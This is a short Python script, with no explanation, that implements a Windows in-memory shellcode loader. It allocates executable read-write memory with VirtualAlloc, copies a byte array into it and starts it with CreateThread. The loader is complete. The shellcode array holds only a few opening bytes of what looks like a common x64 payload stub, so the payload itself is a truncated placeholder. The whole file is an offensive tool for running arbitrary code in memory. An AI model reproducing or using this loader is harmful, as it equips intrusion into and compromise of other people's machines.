import ctypes

# Shellcode here
shellcode = bytearray([
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50
])

# Allocate memory for shellcode
shellcodeAddr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

if not shellcodeAddr:
    print("Failed to allocate memory")
    exit(1)

# Copy shellcode to memory
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(shellcodeAddr),
    shellcode,
    ctypes.c_int(len(shellcode))
)

# Crea new thread for handle to execute shellcode
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_void_p(shellcodeAddr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

if not handle:
    print("Failed to create thread")
    exit(1)

# Wait for thread to finish - never will
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))

# Clean Up - never will
ctypes.windll.kernel32.CloseHandle(ctypes.c_int(handle))
ctypes.windll.kernel32.VirtualFree(ctypes.c_void_p(shellcodeAddr), ctypes.c_int(0), ctypes.c_int(0x8000))
